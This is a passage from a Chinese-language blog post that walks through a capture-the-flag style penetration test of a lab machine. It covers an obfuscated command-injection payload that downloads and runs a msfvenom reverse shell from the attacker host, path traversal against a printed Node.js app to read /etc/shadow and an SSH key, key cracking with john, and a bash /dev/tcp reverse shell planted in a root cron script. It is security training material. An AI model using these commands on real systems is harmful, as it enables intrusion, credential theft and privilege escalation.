rel="noopener">https://github.com/ffuf/ffuf</a></p><p>我们扫到一个maintenance子域名，还有个User-Agent: Mozilla</p><p>然后把这个子域名添加到/etc/hosts 进行访问</p><p><img src="/medias/%5Cfeatureimages%5Cimage-20240615004540054.png" alt></p><p>看到一个简单的表单，然后输入id测试一下发现好像是个命令执行页面</p><p>让后我们可以利用命令执行反弹shell</p><p>我们先生成一个revshell， 让后开启web服务</p><p>去一个在线生成shell的一个网站<a href="https://www.revshells.com/" target="_blank" rel="noopener">Online - Reverse Shell Generator (revshells.com)</a></p><pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=1234 -f elf -o reverse.elf</code></pre><p>然后kali 开启一个web服务</p><pre><code>python3 -m http.server 80</code></pre><p>命令执行绕过指令</p><p>语句拼接</p><pre><code>IFS=];b=wget]192.168.193.128/shell.elf]-P]/tmp;$b;IFS=];c=chmod]+x]/tmp/shell.elf;$c;IFS=];d=/tmp/shell.elf;$d</code></pre><p>然后输入在命令行上面让web服务接收，接收后用</p><pre><code>nc -lp 端口号</code></pre><p>然后在访问一次，然后输个id看看有没有回显，看到有然后我们查看一下有没有python3的脚本或路径</p><pre><code>whereis python3</code></pre><p>看到/usr/bin/python3</p><p>我们可以利用python的pty模块里的一个spawn函数启动一个可以与系统交互的伪终端，</p><pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>然后获得FULL-TTY,查看一下控制字符</p><pre><code>stty -a</code></pre><p>让后输入这条命令</p><pre><code>stty raw -echo;fg;ls;export SHELL=/bin/bash;export TERM=screen;stty rows 28  columns 112 ;reset</code></pre><p>我们echo一下xterm终端看看，是xterm-256color</p><pre><code>echo $TERM</code></pre><p>我们设置一下term环境变量设为这个</p><pre><code>export TERM=xterm-256color</code></pre><p>然后我们用pspy这个工具具体用法看指南下载地址</p><p><a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener">https://github.com/DominicBreuker/pspy</a></p><p>下载好后我们去wget一下这个工具</p><pre><code>wget http://192.168.193.128/pspy64</code></pre><p>试了一下好像不行需要提权一下</p><pre><code>export TERM=xterm-256color</code></pre><p>先该一下环境变量</p><pre><code>script /dev/null -qc /bin/bash</code></pre><p>最后reset</p><pre><code>reset</code></pre><p>然后在wget一下</p><pre><code>wget http://192.168.193.128/pspy64</code></pre><p>然后给这个文件提升一下权限然后运行</p><pre><code>chmod +x pspy64 ./pspy64</code></pre><p><img src="/medias/%5Cfeatureimages%5Cimage-20240616014446247.png" alt></p><p>可以看到每隔一段时间就会运行/opt/nodeapp/copylogs.sh</p><p>我们进这个目录去看一下</p><pre><code>cd /opt/nodeapp/copylogs.sh</code></pre><pre><code>ps aux |grep node</code></pre><p>看到一个server.js文件可以cat来查看一下</p><p><img src="/medias/%5Cfeatureimages%5Cimage-20240616015205991.png" alt></p><pre><code>cat server.js</code></pre><p>看到这个有个文件读取的漏洞</p><pre><code>const express = require(&#39;express&#39;)const { exec } = require(&#39;child_process&#39;);var path = require(&#39;path&#39;);const app = express()const port = 3000const apiToken = &#39;8c2b6a304191b8e2d81aaa5d1131d83d&#39;;function checkApiToken(req, res, next) {  let sendApiToken = req.query[&quot;api-token&quot;] ?? &#39;&#39;;  if (apiToken !== sendApiToken) {    res.send(&quot;Unauthorized.&quot;)    return;  }  next();}app.use(&#39;/logs&#39;, (req, res) =&gt; {  let path_to_file = __dirname + &#39;/logs/modsec_audit.log&#39;  res.sendFile(path_to_file)})app.get(&#39;/&#39;, checkApiToken, (req, res) =&gt; {  res.send(&#39;API de mantenimiento!&#39;);})app.get(&#39;/restart&#39;, checkApiToken, (req, res) =&gt; {  exec(&#39;reboot&#39;, (error, stdout, stderr) =&gt; {    if (error) {      res.send(`exec error: ${error}`)      return;    }    res.send(&#39;Restarting server...&#39;);  });})app.get(&#39;/readfile&#39;, checkApiToken, (req, res) =&gt; {  let file = req.query[&quot;file&quot;] ?? &#39;&#39;;  if (file === &#39;&#39;) {    res.send(&#39;Error: need file&#39;)    return;  }  if (file.indexOf(&#39;passwd&#39;) !== -1) {    res.send(&#39;ForbiddenError: Forbidden&#39;)    return;  }  let path_to_file = __dirname + file  res.sendFile(path.resolve(path_to_file))})app.listen(port,  () =&gt; {  console.log(`Example app listening on port ${port}`)})</code></pre><pre><code>curl &#39;htto://192.168.193.143:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&amp;file=../../../../etc/shadow&#39;</code></pre><p>试了一下可以读取/etc/shaow说明是root权限，但是好像过滤了passwd字段，所以没有去度/passwd</p><p>然后我们查看一下home发现一个tester文件应该是用户同样也存在/etc/passwd文件</p><pre><code>ls /home/</code></pre><p>我们读取这个用户的私钥尝试登陆</p><pre><code>curl &#39;htto://192.168.193.143:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&amp;file=../../../../home/tester/.ssh/id_rsa&#39;</code></pre><p>可以读取</p><pre><code>curl &#39;htto://192.168.193.143:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&amp;file=../../../../home/tester/.ssh/id_rsa&#39; -o tester</code></pre><pre><code>ssh tester@192.168.193.143 -i tester</code></pre><pre><code>chmod 600 tester</code></pre><p>然后连接还是需要密码，我们不知道密码直接爆破试试</p><pre><code>ssh2john tester &gt; testerhash</code></pre><pre><code>john testerhash</code></pre><p>爆破出来就可以直接登陆了</p><p>登陆后id看一下没有啥</p><p>继续使用pspy工具探测一下</p><pre><code>wget http://192.168.193.128/pspy64.pspy64</code></pre><pre><code>chmod +x pspy64.pspy64</code></pre><pre><code>./pspy64.pspy64</code></pre><p><img src="/medias/%5Cfeatureimages%5Cimage-20240616024542988.png" alt></p><p>发现这个文件每隔一段时间就会执行一次，这个程序是root权限，但是我们当前用户拥有所属组的权限，可以进行修改这个文件反弹shell</p><pre><code>cd /opt/nodeapp/</code></pre><pre><code>nano copylogs.sh</code></pre><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.193.128/8888 0&gt;&amp;1</code></pre><p>然后去监听等他文件自动执行登陆</p><pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><pre><code>stty raw -echo;fg;export SHELL=/bin/bash;export TERM=xterm-256color;</code></pre><p>最后拿到flag  </p><pre><code>stty -astty rows 28  columns 98</code></pre><pre><code>cat user-afa83c8bac2338a439766f22e8245636.txtcat  root-e765ca897810e6e2da0e594113bfe9b3.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> 靶机打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
